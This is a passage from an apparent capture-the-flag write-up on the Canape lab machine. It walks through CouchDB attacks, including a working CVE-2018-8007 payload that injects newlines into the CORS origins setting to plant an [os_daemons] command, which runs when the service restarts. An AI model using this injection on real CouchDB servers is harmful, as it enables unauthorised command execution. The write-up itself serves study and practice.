www-data@canape:/dev/shm$ curl -X POST 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"df": {"map": ""} }, "language": "cmd"}' -H "Referer: http://localhost:5984"
{"error":"bad_content_type","reason":"Content-Type must be multipart/form-data"}

www-data@canape:/dev/shm$ curl -X POST 'http://0xdf:df@localhost:5984/df/_design/zero' -d '{"_id": "_design/zero", "views": {"df": {"map": ""} }, "language": "cmd"}' -H "Referer: http://localhost:5984" -H "Content-Type: multipart/form-data"
{"error":"case_clause","reason":"undefined","ref":627893255}

```

At this point, I am stuck. An undefined “case\_clause” error wasn’t too Googleable. And this isn’t really a path for this box anyway. If you know why it’s breaking here, please leave a comment!

#### Successful CVE-2018-8007 With root Help

In writing this post, I found a new CVE had been released for CouchDB from mdsec, [CVE-2018-8007](https://www.mdsec.co.uk/2018/08/advisory-cve-2018-8007-apache-couchdb-remote-code-execution/). It also requires writes to the `local.ini` file, so it isn’t a useful option for Canape. But since I’ve already made it writable as root, let’s see if we can get it to work.

Start with a clean and now writable `local.ini` (and a backup):

```

root@canape:/home/homer/etc# ls -l
total 40
-r--r--r-- 1 homer homer 18477 Jan 20  2018 default.ini
-rw-rw-rw- 1 homer homer  4841 Sep 14 17:39 local.ini
-r--r--r-- 1 root  root   4841 Sep 14 14:30 local.ini.bk
-r--r--r-- 1 homer homer  1345 Jan 14  2018 vm.args

```

We can use curl to modify the origins in the `local.ini` file. The vulnerability here is that if we use curl to put a new origin and then newlines, we can write additional stuff, including a new header and details. So we’ll take advantage of the `[os_daemons]` field, and add a process for CouchDB to try to keep running:

```

www-data@canape:/dev/shm$ curl -X PUT 'http://0xdf:df@localhost:5984/_node/couchdb@localhost/_config/cors/origins' -H "Accept: application/json" -H "Content-Type: application/json" -d "0xdf\n\n[os_daemons]\ntestdaemon = /usr/bin/touch /tmp/0xdf"

```

In the root shell, we can see what changes:

```

root@canape:/home/homer/etc# diff local.ini local.ini.bk
119,124d118
<
< [cors]
< origins = 0xdf
<
< [os_daemons]
< test_daemon = /usr/bin/touch /tmp/0xdf

```

And yet, the file isn’t there:

```

root@canape:/home/homer/etc# ls /tmp/0xdf
ls: cannot access '/tmp/0xdf': No such file or directory

```

If we look at the processes running with “couchdb” in the cmdline, we see not only the line command line that gives us the cookie value we used earlier, but also `runsrv couchdb`:

```

root@canape:/home/homer/bin# ps aux | grep couch
root        711  0.0  0.0   4240   696 ?        Ss   14:28   0:00 runsv couchdb
root        728  0.0  0.0   4384   812 ?        S    14:28   0:00 svlogd -tt /var/log/couchdb
homer      1785  0.8  3.1 638992 31248 ?        Sl   17:55   0:01 /home/homer/bin/../erts-7.3/bin/beam -K true -A 16 -Bd -- -root /home/homer/bin/.. -progname couchdb -- -home /home/homer -- -boot /home/homer/bi
n/../releases/2.0.0/couchdb -name couchdb@localhost -setcookie monster -kernel error_logger silent -sasl sasl_error_logger false -noshell -noinput -config /home/homer/bin/../releases/2.0.0/sys.config

```

If we kill that process, it comes right back (notice the new pid):

```

root@canape:/home/homer/etc# kill 711
root@canape:/home/homer/etc# ps aux | grep runsrv
root       2031  0.0  0.0  14224   980 pts/2    S+   18:09   0:00 grep --color=auto runsrv

```

And, on restart, runs the OS\_Daemons:

```

root@canape:/home/homer/etc# ls /tmp/0xdf
/tmp/0xdf

```

This too could get us a shell as homer.